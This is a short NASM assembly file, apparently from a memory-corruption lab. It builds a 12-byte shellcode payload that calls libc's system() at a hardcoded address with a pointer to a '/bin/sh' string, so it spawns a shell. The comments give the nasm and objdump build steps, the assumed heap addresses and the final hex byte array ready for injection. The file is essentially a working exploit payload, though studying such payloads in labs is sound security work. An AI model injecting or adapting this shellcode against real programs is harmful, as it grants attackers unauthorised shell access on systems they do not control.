;nasm -f elf32 -o payload_asm.o payload_asm.asm
;objdump -d payload_asm.o
;total dump size: 0xc
;heap start: 0x0804a008
;bin/sh string location: 0x0804a008 + 0xc = 0x804a014
;final hexdump: (char[12]){0x68, 0x14, 0xa0, 0x04, 0x08, 0xb8, 0x60, 0xb0, 0xe6, 0xb7, 0xff, 0xd0}

section .text
	global _start

_start:
	push 0x804a014; address of "/bin/sh"
	mov eax, 0xb7e6b060; location of 'system' function
	call eax; absolute call using eax instead of a relative call!